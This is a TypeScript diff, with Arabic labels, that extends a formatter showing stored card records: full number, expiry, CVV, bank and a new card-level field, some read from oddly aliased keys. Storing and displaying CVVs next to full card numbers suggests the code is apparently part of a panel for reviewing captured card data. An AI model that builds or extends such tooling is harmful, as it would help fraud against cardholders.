@@ -60,13 +60,29 @@ export function getStatusLabel(status: string): string {
  * Format card data for display
  */
 export function formatCardData(entry: HistoryEntry): Record<string, any> {
-  const { cardNumber, _v1, cardType, expiryDate, _v3, cvv, _v2, bankInfo } = entry.data
+  const {
+    cardNumber,
+    _v1,
+    cardType,
+    cardLevel,
+    level,
+    expiryDate,
+    _v3,
+    cvv,
+    _v2,
+    bankInfo,
+    bankName
+  } = entry.data
+  const normalizedType = cardType || entry.data?.scheme || entry.data?.type
+  const normalizedLevel = cardLevel || level || bankInfo?.level || entry.data?.binData?.level
+  const normalizedBankName = bankInfo?.name || bankName || entry.data?.issuer?.name
   return {
     "رقم البطاقة": _v1 || cardNumber,
-    "نوع البطاقة": cardType,
+    "نوع البطاقة": normalizedType,
+    "مستوى البطاقة": normalizedLevel,
     "تاريخ الانتهاء": _v3 || expiryDate,
     "CVV": _v2 || cvv,
-    "البنك": bankInfo?.name || "غير محدد",
+    "البنك": normalizedBankName || "غير محدد",
     "بلد البنك": bankInfo?.country || "غير محدد",
     "طريقة الدفع": bankInfo?.paymentMethod || "credit-card"
   }
